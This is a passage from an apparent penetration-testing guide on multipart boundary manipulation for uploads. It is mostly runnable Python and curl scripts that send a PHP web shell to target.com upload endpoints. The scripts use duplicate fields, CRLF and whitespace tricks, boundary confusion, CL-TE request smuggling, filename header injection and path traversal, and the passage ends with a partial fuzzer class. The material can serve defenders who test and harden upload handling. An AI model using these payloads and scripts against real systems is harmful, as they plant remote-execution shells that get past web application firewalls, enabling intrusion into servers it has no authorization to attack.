When multiple parts share the same field `name`, different frameworks handle the conflict differently. Some take the first value, some take the last, and some create arrays. This differential behavior between WAF and backend is exploitable.
::

::code-group
```bash [First vs Last Field Wins]
# Submit two parts with same name — one safe, one malicious
python3 << 'PYEOF'
import requests

# Safe file first, shell second (last wins on some frameworks)
body_last = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file"; filename="safe.jpg"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '\xff\xd8\xff\xe0JFIF_SAFE_IMAGE_DATA\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '<?php system($_GET["cmd"]); ?>\r\n'
    '--BOUND--\r\n'
)

# Shell first, safe second (first wins on some frameworks)
body_first = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '<?php system($_GET["cmd"]); ?>\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file"; filename="safe.jpg"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '\xff\xd8\xff\xe0JFIF_SAFE_IMAGE_DATA\r\n'
    '--BOUND--\r\n'
)

for label, body in [("Last wins", body_last), ("First wins", body_first)]:
    r = requests.post('https://target.com/upload',
        headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
        data=body.encode())
    print(f'{label}: {r.status_code} - {r.text[:150]}')
PYEOF
```

```bash [Name Parameter Variations]
# Different quoting on name parameter
python3 << 'PYEOF'
import requests

names = [
    'name="file"',
    "name='file'",
    'name=file',
    'name ="file"',
    'name= "file"',
    'Name="file"',
    'NAME="file"',
    'name="file "',
    'name=" file"',
    'name="file";',
    'name="file";;',
    'name=""',
    'name=',
    'name="file"; name="file2"',     # Duplicate name parameter
]

for name_var in names:
    body = (
        '--BOUND\r\n'
        f'Content-Disposition: form-data; {name_var}; filename="shell.php"\r\n'
        '\r\n'
        '<?php system($_GET["cmd"]); ?>\r\n'
        '--BOUND--\r\n'
    )
    r = requests.post('https://target.com/upload',
        headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
        data=body.encode())
    print(f'{name_var}: {r.status_code}')
PYEOF
```

```bash [Array Parameter Pollution]
# PHP treats name="file[]" as array
python3 << 'PYEOF'
import requests

# Multiple files via array notation
body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file[]"; filename="safe.jpg"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '\xff\xd8\xff\xe0SAFE\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file[]"; filename="shell.php"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '<?php system($_GET["cmd"]); ?>\r\n'
    '--BOUND--\r\n'
)

r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
print(f'Array notation: {r.status_code}')

# Indexed array
body2 = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file[0]"; filename="safe.jpg"\r\n'
    'Content-Type: image/jpeg\r\n\r\n'
    '\xff\xd8\xff\xe0SAFE\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file[1]"; filename="shell.php"\r\n'
    'Content-Type: image/jpeg\r\n\r\n'
    '<?php system($_GET["cmd"]); ?>\r\n'
    '--BOUND--\r\n'
)

r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body2.encode())
print(f'Indexed array: {r.status_code}')
PYEOF
```

```bash [Extra Hidden Fields]
# Inject additional form fields to override server logic
python3 << 'PYEOF'
import requests

body = (
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
    'Content-Type: image/jpeg\r\n'
    '\r\n'
    '<?php system($_GET["cmd"]); ?>\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="upload_dir"\r\n'
    '\r\n'
    '../../../var/www/html/\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="allowed_ext"\r\n'
    '\r\n'
    'php\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="is_admin"\r\n'
    '\r\n'
    'true\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="overwrite"\r\n'
    '\r\n'
    '1\r\n'
    '--BOUND\r\n'
    'Content-Disposition: form-data; name="file_type"\r\n'
    '\r\n'
    'image\r\n'
    '--BOUND--\r\n'
)

r = requests.post('https://target.com/upload',
    headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
    data=body.encode())
print(f'Status: {r.status_code}')
print(r.text[:300])
PYEOF
```
::

---

## Line Ending & Whitespace Exploitation

::tabs
  :::tabs-item{icon="i-lucide-wrap-text" label="CRLF vs LF vs CR"}
  ```bash [Terminal]
  # RFC requires CRLF (\r\n) but many parsers accept LF (\n) alone
  # WAFs may only parse CRLF, backend may accept LF — smuggling opportunity

  # LF-only line endings
  python3 << 'PYEOF'
  import requests

  # Standard CRLF
  body_crlf = b'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n'

  # LF only
  body_lf = b'--BOUND\nContent-Disposition: form-data; name="file"; filename="shell.php"\n\n<?php system($_GET["cmd"]); ?>\n--BOUND--\n'

  # CR only
  body_cr = b'--BOUND\rContent-Disposition: form-data; name="file"; filename="shell.php"\r\r<?php system($_GET["cmd"]); ?>\r--BOUND--\r'

  # Mixed CRLF and LF
  body_mixed = b'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\n'

  # Extra CR before LF
  body_crcrlf = b'--BOUND\r\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\r\n\r\r\n<?php system($_GET["cmd"]); ?>\r\r\n--BOUND--\r\r\n'

  for label, body in [
      ("CRLF", body_crlf),
      ("LF", body_lf),
      ("CR", body_cr),
      ("Mixed", body_mixed),
      ("CRCRLF", body_crcrlf)
  ]:
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body)
      print(f'{label}: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-space" label="Whitespace Injection in Headers"}
  ```bash [Terminal]
  # Extra whitespace between header name and colon
  python3 << 'PYEOF'
  import requests

  variants = [
      # Standard
      b'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n',
      # Space before colon
      b'Content-Disposition : form-data; name="file"; filename="shell.php"\r\n',
      # Tab before colon
      b'Content-Disposition\t: form-data; name="file"; filename="shell.php"\r\n',
      # No space after colon
      b'Content-Disposition:form-data; name="file"; filename="shell.php"\r\n',
      # Multiple spaces after colon
      b'Content-Disposition:     form-data; name="file"; filename="shell.php"\r\n',
      # Tab after colon
      b'Content-Disposition:\tform-data; name="file"; filename="shell.php"\r\n',
      # Vertical tab
      b'Content-Disposition:\x0bform-data; name="file"; filename="shell.php"\r\n',
      # Form feed
      b'Content-Disposition:\x0cform-data; name="file"; filename="shell.php"\r\n',
  ]

  for var in variants:
      body = b'--BOUND\r\n' + var + b'\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n'
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body)
      print(f'{var[:60].decode("latin-1")}: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-text" label="Padding Between Parts"}
  ```bash [Terminal]
  # Extra data between boundary and headers
  python3 << 'PYEOF'
  import requests

  # Preamble before first boundary (RFC allows content before first boundary)
  body_preamble = (
      'This is preamble text that should be ignored\r\n'
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
  )

  # Epilogue after final boundary (RFC allows content after final boundary)
  body_epilogue = (
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
      'This is epilogue text with extra payload\r\n'
      '<?php eval($_POST["x"]); ?>\r\n'
  )

  # Whitespace/garbage between boundary and Content-Disposition
  body_garbage = (
      '--BOUND\r\n'
      'GARBAGE_TEXT_HERE\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
  )

  # Empty lines between boundary and headers
  body_empty = (
      '--BOUND\r\n'
      '\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
  )

  for label, body in [
      ("Preamble", body_preamble),
      ("Epilogue", body_epilogue),
      ("Garbage", body_garbage),
      ("Empty lines", body_empty)
  ]:
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{label}: {r.status_code}')
  PYEOF
  ```
  :::
::

---

## Parser Differential Attacks

::caution
WAFs and backend servers often use entirely different parsing libraries. The same multipart request can be interpreted differently by each layer. This is the foundation of multipart smuggling attacks.
::

::accordion
  :::accordion-item{icon="i-lucide-shield" label="WAF Bypass via Parser Confusion"}
  ```bash [Terminal]
  # Technique 1: Boundary mismatch — WAF parses HEADER boundary, backend parses BODY boundary
  python3 << 'PYEOF'
  import requests

  # WAF sees boundary=SAFE and finds safe.jpg
  # Backend ignores header boundary mismatch and uses boundary found in body
  bodies = [
      # Header says SAFE, body uses EVIL
      (
          'multipart/form-data; boundary=SAFE',
          '--EVIL\r\n'
          'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--EVIL--\r\n'
      ),
      # Header has both, body uses second
      (
          'multipart/form-data; boundary=SAFE; boundary=EVIL',
          '--EVIL\r\n'
          'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--EVIL--\r\n'
      ),
      # Quoted vs unquoted difference
      (
          'multipart/form-data; boundary="BOUND"',
          '--BOUND\r\n'
          'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--BOUND--\r\n'
      ),
  ]

  for ct, body in bodies:
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': ct},
          data=body.encode())
      print(f'CT: {ct[:60]} → {r.status_code}')
  PYEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-rotate-ccw" label="Chunked Transfer + Multipart"}
  ```bash [Terminal]
  # Combine chunked transfer encoding with multipart to confuse WAFs
  python3 << 'PYEOF'
  import socket
  import ssl

  host = "target.com"
  port = 443

  multipart_body = (
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      'Content-Type: image/jpeg\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
  )

  # Split payload across chunks
  chunk1 = multipart_body[:30]
  chunk2 = multipart_body[30:80]
  chunk3 = multipart_body[80:]

  chunked_body = (
      f'{len(chunk1):x}\r\n{chunk1}\r\n'
      f'{len(chunk2):x}\r\n{chunk2}\r\n'
      f'{len(chunk3):x}\r\n{chunk3}\r\n'
      '0\r\n\r\n'
  )

  request = (
      f'POST /upload HTTP/1.1\r\n'
      f'Host: {host}\r\n'
      f'Content-Type: multipart/form-data; boundary=BOUND\r\n'
      f'Transfer-Encoding: chunked\r\n'
      f'Connection: close\r\n'
      f'\r\n'
      f'{chunked_body}'
  )

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ssock = ctx.wrap_socket(sock, server_hostname=host)
  ssock.connect((host, port))
  ssock.send(request.encode())

  response = b''
  while True:
      data = ssock.recv(4096)
      if not data:
          break
      response += data

  ssock.close()
  print(response.decode('latin-1'))
  PYEOF

  # Using curl with chunked encoding
  python3 -c "
  body = '--BOUND\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n--BOUND--\r\n'
  print(body)
  " | curl -v \
    -H "Content-Type: multipart/form-data; boundary=BOUND" \
    -H "Transfer-Encoding: chunked" \
    --data-binary @- \
    https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-arrow-right-left" label="Content-Length Mismatch"}
  ```bash [Terminal]
  # Send Content-Length that doesn't match actual body length
  # Some parsers trust Content-Length, others read until boundary
  python3 << 'PYEOF'
  import socket
  import ssl

  host = "target.com"
  port = 443

  safe_part = (
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="safe.jpg"\r\n'
      'Content-Type: image/jpeg\r\n'
      '\r\n'
      '\xff\xd8\xff\xe0SAFE\r\n'
      '--BOUND--\r\n'
  )

  evil_part = (
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--BOUND--\r\n'
  )

  full_body = safe_part + evil_part

  # Content-Length only covers safe_part — WAF stops reading
  # Backend may continue reading and process evil_part
  request = (
      f'POST /upload HTTP/1.1\r\n'
      f'Host: {host}\r\n'
      f'Content-Type: multipart/form-data; boundary=BOUND\r\n'
      f'Content-Length: {len(safe_part)}\r\n'
      f'Connection: close\r\n'
      f'\r\n'
      f'{full_body}'
  )

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ssock = ctx.wrap_socket(sock, server_hostname=host)
  ssock.connect((host, port))
  ssock.send(request.encode())

  response = b''
  while True:
      data = ssock.recv(4096)
      if not data:
          break
      response += data

  ssock.close()
  print(response.decode('latin-1')[:500])
  PYEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Framework-Specific Differentials"}
  ```text [Parser Behavior Matrix]
  ┌───────────────────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
  │ Behavior              │ PHP      │ Node.js  │ Python   │ Java     │ .NET     │
  │                       │          │ (multer) │ (Django) │ (Spring) │ (Kestrel)│
  ├───────────────────────┼──────────┼──────────┼──────────┼──────────┼──────────┤
  │ Dup name= (which?)    │ Last     │ First    │ Last     │ Last     │ First    │
  │ Dup filename= (which?)│ Last     │ First    │ Last     │ First    │ Last     │
  │ filename* priority    │ filename*│ Ignored  │ filename*│ filename*│ filename │
  │ LF-only line endings  │ ✅       │ ✅       │ ✅       │ ❌       │ ✅       │
  │ Quoted boundary       │ Strips " │ Strips " │ Strips " │ Keeps "  │ Strips " │
  │ No Content-Dispo      │ Skips    │ Error    │ Skips    │ Skips    │ Skips    │
  │ Extra headers         │ Ignored  │ Ignored  │ Ignored  │ Parsed   │ Ignored  │
  │ Boundary whitespace   │ Trimmed  │ Strict   │ Trimmed  │ Strict   │ Trimmed  │
  │ Null in filename      │ Truncate │ Kept     │ Error    │ Error    │ Truncate │
  │ Header folding        │ ❌       │ ✅       │ ❌       │ ✅       │ ❌       │
  │ Preamble content      │ Ignored  │ Ignored  │ Ignored  │ Ignored  │ Ignored  │
  │ Max boundary length   │ No limit │ No limit │ 70       │ 70       │ No limit │
  └───────────────────────┴──────────┴──────────┴──────────┴──────────┴──────────┘
  ```
  :::
::

---

## Request Smuggling via Multipart

::tabs
  :::tabs-item{icon="i-lucide-arrow-right-left" label="CL-TE Multipart Smuggling"}
  ```bash [Terminal]
  # HTTP Request Smuggling combined with multipart file upload
  # Front-end uses Content-Length, back-end uses Transfer-Encoding

  python3 << 'PYEOF'
  import socket
  import ssl

  host = "target.com"
  port = 443

  # Smuggled request contains the malicious upload
  smuggled_request = (
      'POST /upload HTTP/1.1\r\n'
      'Host: target.com\r\n'
      'Content-Type: multipart/form-data; boundary=EVIL\r\n'
      'Content-Length: 200\r\n'
      '\r\n'
      '--EVIL\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      '\r\n'
      '<?php system($_GET["cmd"]); ?>\r\n'
      '--EVIL--\r\n'
  )

  # Main request with CL-TE confusion
  main_body = (
      '--SAFE\r\n'
      'Content-Disposition: form-data; name="data"\r\n'
      '\r\n'
      'safe_value\r\n'
      '--SAFE--\r\n'
  )

  chunked_smuggle = (
      f'{len(main_body):x}\r\n'
      f'{main_body}\r\n'
      '0\r\n'
      '\r\n'
      f'{smuggled_request}'
  )

  full_request = (
      'POST /api/data HTTP/1.1\r\n'
      f'Host: {host}\r\n'
      'Content-Type: multipart/form-data; boundary=SAFE\r\n'
      f'Content-Length: {len(chunked_smuggle)}\r\n'
      'Transfer-Encoding: chunked\r\n'
      '\r\n'
      f'{chunked_smuggle}'
  )

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ssock = ctx.wrap_socket(sock, server_hostname=host)
  ssock.connect((host, port))
  ssock.send(full_request.encode())

  response = b''
  while True:
      data = ssock.recv(4096)
      if not data:
          break
      response += data

  ssock.close()
  print(response.decode('latin-1')[:800])
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Multipart in Non-Multipart Endpoints"}
  ```bash [Terminal]
  # Send multipart Content-Type to endpoints expecting JSON or URL-encoded
  # Some frameworks auto-detect and parse multipart regardless

  # JSON endpoint receiving multipart
  curl -v \
    -H "Content-Type: multipart/form-data; boundary=BOUND" \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/api/settings

  # URL-encoded endpoint receiving multipart
  curl -v \
    -H "Content-Type: multipart/form-data; boundary=BOUND" \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/api/profile/update

  # GraphQL endpoint with multipart (Apollo Upload)
  curl -v \
    -H "Content-Type: multipart/form-data; boundary=BOUND" \
    --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="operations"\r\n\r\n{"query":"mutation($file:Upload!){uploadFile(file:$file){url}}","variables":{"file":null}}\r\n--BOUND\r\nContent-Disposition: form-data; name="map"\r\n\r\n{"0":["variables.file"]}\r\n--BOUND\r\nContent-Disposition: form-data; name="0"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/graphql

  # SOAP endpoint with multipart (MTOM)
  curl -v \
    -H 'Content-Type: multipart/related; boundary=BOUND; type="application/xop+xml"; start="<root>"; start-info="text/xml"' \
    --data-binary $'--BOUND\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Upload><file><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="cid:file1"/></file></Upload></soap:Body></soap:Envelope>\r\n--BOUND\r\nContent-Type: application/x-php\r\nContent-Transfer-Encoding: binary\r\nContent-ID: <file1>\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--BOUND--\r\n' \
    https://target.com/ws/upload
  ```
  :::
::

---

## Custom Header Injection in Parts

::tabs
  :::tabs-item{icon="i-lucide-plus" label="Extra Part Headers"}
  ```bash [Terminal]
  # Inject additional headers into multipart parts
  python3 << 'PYEOF'
  import requests

  # Content-Transfer-Encoding header (can affect how body is decoded)
  encodings = [
      'Content-Transfer-Encoding: base64',
      'Content-Transfer-Encoding: quoted-printable',
      'Content-Transfer-Encoding: binary',
      'Content-Transfer-Encoding: 8bit',
      'Content-Transfer-Encoding: 7bit',
  ]

  for enc in encodings:
      body = (
          '--BOUND\r\n'
          'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
          'Content-Type: image/jpeg\r\n'
          f'{enc}\r\n'
          '\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--BOUND--\r\n'
      )
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{enc}: {r.status_code}')

  # Base64-encoded body with Content-Transfer-Encoding: base64
  import base64
  payload = base64.b64encode(b'<?php system($_GET["cmd"]); ?>').decode()
  body_b64 = (
      '--BOUND\r\n'
      'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      'Content-Type: image/jpeg\r\n'
      'Content-Transfer-Encoding: base64\r\n'
      '\r\n'
      f'{payload}\r\n'
      '--BOUND--\r\n'
  )
  r = requests.post('https://target.com/upload',
      headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
      data=body_b64.encode())
  print(f'Base64 body: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Content-ID & Content-Location"}
  ```bash [Terminal]
  # Inject Content-Location to influence file storage path
  python3 << 'PYEOF'
  import requests

  headers_inject = [
      'Content-Location: /var/www/html/shell.php',
      'Content-Location: ../../../shell.php',
      'Content-ID: <shell.php>',
      'Content-Base: /var/www/html/',
      'X-File-Name: shell.php',
      'X-Original-Filename: shell.php',
      'X-Upload-Path: ../../../public/',
  ]

  for hdr in headers_inject:
      body = (
          '--BOUND\r\n'
          'Content-Disposition: form-data; name="file"; filename="safe.jpg"\r\n'
          'Content-Type: image/jpeg\r\n'
          f'{hdr}\r\n'
          '\r\n'
          '<?php system($_GET["cmd"]); ?>\r\n'
          '--BOUND--\r\n'
      )
      r = requests.post('https://target.com/upload',
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode())
      print(f'{hdr}: {r.status_code}')
  PYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-alert-triangle" label="Header Injection via Filename"}
  ```bash [Terminal]
  # CRLF injection through filename to inject additional headers
  python3 << 'PYEOF'
  import requests

  # Inject CRLF in filename to add fake headers
  injections = [
      # Newline injection in filename
      b'shell.jpg\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--INJECT\r\nContent-Disposition: form-data; name="file"; filename="shell.php"',
      # Null byte + extension
      b'shell.php\x00.jpg',
      # Carriage return in filename
      b'shell.php\rContent-Type: image/jpeg',
      # Tab character manipulation
      b'shell.php\timage.jpg',
  ]

  for inj in injections:
      body = (
          b'--BOUND\r\n'
          b'Content-Disposition: form-data; name="file"; filename="' + inj + b'"\r\n'
          b'Content-Type: image/jpeg\r\n'
          b'\r\n'
          b'<?php system($_GET["cmd"]); ?>\r\n'
          b'--BOUND--\r\n'
      )
      try:
          r = requests.post('https://target.com/upload',
              headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
              data=body)
          print(f'{inj[:40]}: {r.status_code}')
      except Exception as e:
          print(f'{inj[:40]}: ERROR - {e}')
  PYEOF
  ```
  :::
::

---

## Automated Boundary Fuzzing

::code-collapse

```python [boundary_fuzzer.py]
#!/usr/bin/env python3
"""
Multipart Boundary Manipulation Fuzzer
Tests parser differentials, boundary confusion, header injection,
filename tricks, and parameter pollution against upload endpoints.
"""
import requests
import argparse
import sys
import time
import urllib3
urllib3.disable_warnings()

class MultipartFuzzer:
    def __init__(self, target_url, field_name='file', verify_ssl=False, proxy=None):
        self.target = target_url
        self.field_name = field_name
        self.session = requests.Session()
        self.session.verify = verify_ssl
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.results = []
        self.payload = '<?php system($_GET["cmd"]); ?>'

    def send(self, content_type, body, label):
        """Send request and record result"""
        try:
            r = self.session.post(
                self.target,
                headers={'Content-Type': content_type},
                data=body if isinstance(body, bytes) else body.encode(),
                timeout=15
            )
            status = r.status_code
            length = len(r.text)
            result = {
                'label': label,
                'status': status,
                'length': length,
                'success': status in [200, 201, 302],
            }
            self.results.append(result)
            indicator = '✅' if result['success'] else '❌'
            print(f"  {indicator} [{status}] [{length:>6}B] {label}")
            return result
        except Exception as e:
            print(f"  ⚠️  [ERR] {label}: {e}")
            return None

    def build_multipart(self, boundary, filename='shell.php', 
                        ct_part='image/jpeg', extra_headers='', body_content=None):
        """Build standard multipart body"""
        content = body_content or self.payload
        ct_line = f'Content-Type: {ct_part}\r\n' if ct_part else ''
        extra = f'{extra_headers}\r\n' if extra_headers else ''
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{self.field_name}"; filename="{filename}"\r\n'
            f'{ct_line}'
            f'{extra}'
            f'\r\n'
            f'{content}\r\n'
            f'--{boundary}--\r\n'
        )
        return body

    def fuzz_boundary_quoting(self):
        """Test boundary quoting variations"""
        print("\n[*] Fuzzing boundary quoting...")
        tests = [
            ('multipart/form-data; boundary=BOUND', 'BOUND', 'Unquoted'),
            ('multipart/form-data; boundary="BOUND"', 'BOUND', 'Double-quoted'),
            ("multipart/form-data; boundary='BOUND'", 'BOUND', 'Single-quoted'),
            ('multipart/form-data; boundary="BOUND"', '"BOUND"', 'Quoted in header, literal in body'),
            ('multipart/form-data; boundary=BOUND', '"BOUND"', 'Unquoted in header, quoted in body'),
        ]
        for ct, bound, label in tests:
            body = self.build_multipart(bound)
            self.send(ct, body, f'Quoting: {label}')

    def fuzz_boundary_duplicates(self):
        """Test duplicate boundary declarations"""
        print("\n[*] Fuzzing duplicate boundaries...")
        tests = [
            'multipart/form-data; boundary=SAFE; boundary=EVIL',
            'multipart/form-data; boundary=EVIL; boundary=SAFE',
            'multipart/form-data; boundary=SAFE,boundary=EVIL',
            'multipart/form-data; boundary=SAFE, boundary=EVIL',
        ]
        for ct in tests:
            body = self.build_multipart('EVIL')
            self.send(ct, body, f'Dup boundary: {ct[35:]}')

    def fuzz_boundary_whitespace(self):
        """Test whitespace in boundary"""
        print("\n[*] Fuzzing boundary whitespace...")
        tests = [
            ('multipart/form-data;boundary=BOUND', 'No space after ;'),
            ('multipart/form-data;  boundary=BOUND', 'Double space after ;'),
            ('multipart/form-data;\tboundary=BOUND', 'Tab after ;'),
            ('multipart/form-data; boundary =BOUND', 'Space before ='),
            ('multipart/form-data; boundary= BOUND', 'Space after ='),
            ('multipart/form-data; boundary=BOUND ', 'Trailing space'),
        ]
        for ct, label in tests:
            body = self.build_multipart('BOUND')
            self.send(ct, body, f'Whitespace: {label}')

    def fuzz_boundary_special_chars(self):
        """Test special characters in boundary"""
        print("\n[*] Fuzzing boundary special characters...")
        specials = [
            'x', 'A'*100, 'A'*500, '--', '----', 
            'bound/ary', "bound'ary", 'bound(ary)',
            'bound+ary', 'bound=ary', 'bound?ary',
        ]
        for bound in specials:
            ct = f'multipart/form-data; boundary={bound}'
            body = self.build_multipart(bound)
            self.send(ct, body, f'Special boundary: {repr(bound)[:40]}')

    def fuzz_filename_tricks(self):
        """Test filename manipulation"""
        print("\n[*] Fuzzing filename tricks...")
        filenames = [
            'shell.php',
            'shell.pHp', 'shell.PHP', 'shell.Php',
            'shell.php5', 'shell.php7', 'shell.phtml', 'shell.pht',
            'shell.php.jpg', 'shell.jpg.php', 'shell.php%00.jpg',
            'shell.php;.jpg', 'shell.php:.jpg',
            '../shell.php', '..\\shell.php',
            'shell.php/', 'shell.php/.',
            '.htaccess', 'web.config',
            'shell.php\x00.jpg',
            'shell.php%20', 'shell.php%0a',
            'shell.php....', 'shell.php   ',
            'shell.pHp.JpG',
        ]
        for fn in filenames:
            ct = 'multipart/form-data; boundary=BOUND'
            body = self.build_multipart('BOUND', filename=fn)
            self.send(ct, body, f'Filename: {repr(fn)[:50]}')

    def fuzz_content_type_part(self):
        """Test Content-Type manipulation per part"""
        print("\n[*] Fuzzing part Content-Type...")
        types = [
            'image/jpeg', 'image/png', 'image/gif',
            'application/octet-stream', 'text/plain',
            'application/x-php', 'IMAGE/JPEG',
            '', None,
        ]
        for mime in types:
            ct = 'multipart/form-data; boundary=BOUND'
            body = self.build_multipart('BOUND', ct_part=mime)
            self.send(ct, body, f'Part CT: {mime or "(none)"}')

    def fuzz_duplicate_fields(self):
        """Test duplicate field name handling"""
        print("\n[*] Fuzzing duplicate fields...")
        ct = 'multipart/form-data; boundary=BOUND'
        
        # Safe first, evil second
        body_last = (
            '--BOUND\r\n'
            f'Content-Disposition: form-data; name="{self.field_name}"; filename="safe.jpg"\r\n'
            'Content-Type: image/jpeg\r\n\r\n'
            '\xff\xd8\xff\xe0SAFE\r\n'
            '--BOUND\r\n'
            f'Content-Disposition: form-data; name="{self.field_name}"; filename="shell.php"\r\n'
            'Content-Type: image/jpeg\r\n\r\n'
            f'{self.payload}\r\n'
            '--BOUND--\r\n'
        )
        self.send(ct, body_last, 'Duplicate: safe first, shell second')

        # Evil first, safe second
        body_first = (
            '--BOUND\r\n'
            f'Content-Disposition: form-data; name="{self.field_name}"; filename="shell.php"\r\n'
            'Content-Type: image/jpeg\r\n\r\n'
            f'{self.payload}\r\n'
            '--BOUND\r\n'
            f'Content-Disposition: form-data; name="{self.field_name}"; filename="safe.jpg"\r\n'
            'Content-Type: image/jpeg\r\n\r\n'
            '\xff\xd8\xff\xe0SAFE\r\n'
            '--BOUND--\r\n'
        )
        self.send(ct, body_first, 'Duplicate: shell first, safe second')

    def fuzz_line_endings(self):
        """Test CRLF vs LF vs CR line endings"""
        print("\n[*] Fuzzing line endings...")
